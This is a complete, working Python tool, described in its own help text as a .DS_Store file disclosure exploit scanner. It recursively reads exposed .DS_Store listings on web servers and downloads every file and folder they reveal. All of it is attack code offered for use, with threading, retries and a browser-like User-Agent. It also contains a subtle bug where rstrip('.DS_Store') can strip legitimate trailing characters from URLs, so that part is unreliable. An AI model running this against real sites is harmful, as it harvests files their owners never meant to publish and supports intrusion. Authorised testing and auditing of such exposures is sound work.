import sys
import os
import queue
import threading
from io import BytesIO
from urllib.parse import urlparse, urljoin
import requests
from ds_store import DSStore
import argparse
import logging
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class Scanner:
    def __init__(self, urls, dest_dir, threads, timeout, save_ds):
        self.queue = queue.Queue()
        for url in urls:
            self.queue.put(url.rstrip('/'))
        self.processed_urls = set()
        self.lock = threading.Lock()
        self.working_threads = 0
        self.dest_dir = os.path.abspath(dest_dir)
        self.threads = threads
        self.timeout = timeout
        self.save_ds = save_ds
        if not os.path.exists(self.dest_dir):
            os.makedirs(self.dest_dir)

        logging.basicConfig(
            filename=os.path.join(self.dest_dir, "scan.log"),
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s",
        )

        self.session = requests.Session()
        retries = Retry(
            total=3,
            backoff_factor=0.3,
            status_forcelist=[500, 502, 503, 504],
            allowed_methods=["HEAD", "GET"]
        )
        adapter = HTTPAdapter(max_retries=retries)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (compatible; Scanner/1.0)'})

        self.urls_by_status = {}

    def is_valid_name(self, entry_name):
        if '..' in entry_name or entry_name.startswith('/') or entry_name.startswith('\\'):
            logging.error(f"Invalid entry name due to path traversal or root reference: {entry_name}")
            return False
        try:
            abs_path = os.path.abspath(os.path.join(self.dest_dir, entry_name))
            if not abs_path.startswith(self.dest_dir):
                logging.error(f"Invalid entry name outside destination directory: {entry_name}")
                return False
        except Exception as e:
            logging.error(f"Error validating entry name {entry_name}: {e}")
            return False
        return True

    def process(self):
        while True:
            try:
                url = self.queue.get(timeout=2.0)
                with self.lock:
                    self.working_threads += 1
            except queue.Empty:
                if self.working_threads == 0:
                    break
                continue

            try:
                if url in self.processed_urls:
                    continue

                self.processed_urls.add(url)
                base_url = url.rstrip('.DS_Store')
                base_url = base_url.rstrip('/')

                response = self.session.get(url, allow_redirects=False, timeout=self.timeout)
                status_code = response.status_code

                with self.lock:
                    if status_code not in self.urls_by_status:
                        self.urls_by_status[status_code] = []
                    if not (not self.save_ds and url.endswith('.DS_Store')):
                        self.urls_by_status[status_code].append(url)

                if status_code == 200:
                    parsed_url = urlparse(url)
                    path_parts = list(filter(None, parsed_url.path.split('/')))
                    folder_path = os.path.join(
                        self.dest_dir,
                        parsed_url.netloc.replace(':', '_'),
                        *path_parts[:-1]
                    )
                    if not os.path.exists(folder_path):
                        os.makedirs(folder_path)

                    file_name = os.path.basename(parsed_url.path)
                    if not file_name or file_name.endswith('/'):
                        file_name = 'index.html'

                    file_path = os.path.join(folder_path, file_name)
                    with open(file_path, 'wb') as f:
                        f.write(response.content)

                    logging.info(f"[200] Downloaded: {url}")

                    if url.endswith('.DS_Store'):
                        ds_store_file = BytesIO(response.content)
                        ds_store_file.seek(0)
                        with DSStore.open(ds_store_file) as d:
                            for entry in d:
                                if self.is_valid_name(entry.filename):
                                    entry_filename = entry.filename.lstrip('/')
                                    child_file_url = urljoin(base_url + '/', entry_filename)
                                    child_dir_url = urljoin(base_url + '/', entry_filename.rstrip('/') + '/')

                                    if child_file_url not in self.processed_urls:
                                        self.queue.put(child_file_url)

                                    if child_dir_url not in self.processed_urls and child_dir_url != child_file_url:
                                        self.queue.put(child_dir_url)

                                    child_ds_store_url = urljoin(child_dir_url, '.DS_Store')
                                    if child_ds_store_url not in self.processed_urls:
                                        self.queue.put(child_ds_store_url)
                else:
                    logging.warning(f"[{status_code}] Access to {url} resulted in status code {status_code}")

            except Exception as e:
                logging.error(f"Error processing {url}: {e}")

            finally:
                with self.lock:
                    self.working_threads -= 1

    def scan(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.process)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        for status_code, urls in self.urls_by_status.items():
            status_file_path = os.path.join(self.dest_dir, f"{status_code}_urls.txt")
            with open(status_file_path, 'w') as f:
                for url in urls:
                    f.write(url + "\n")
            print(f"URLs with status code {status_code} saved to: {status_file_path}")

        print(f"Scan completed. Results saved in: {os.path.abspath(self.dest_dir)}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="A .DS_Store file disclosure exploit scanner.",
        usage="%(prog)s [-h] [-u URL] [-l URL_LIST] [-o OUTPUT] [-t THREADS] [--timeout TIMEOUT] [-ds]"
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Starting URL (e.g., https://example.com/.DS_Store)")
    group.add_argument("-l", "--list", help="File containing a list of URLs to scan")
    parser.add_argument("-o", "--output", default="results", help="Directory to save results")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout for HTTP requests in seconds (default: 10)")
    parser.add_argument("-ds", "--save-ds", action="store_true", help="Save URLs ending with .DS_Store in status code results")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    try:
        args = parser.parse_args()
    except SystemExit:
        parser.print_help()
        sys.exit(1)

    urls = []
    if args.url:
        urls.append(args.url)
    elif args.list:
        if os.path.exists(args.list):
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
        else:
            print(f"Error: The file {args.list} does not exist.")
            sys.exit(1)

    scanner = Scanner(urls, args.output, args.threads, args.timeout, args.save_ds)
    scanner.scan()
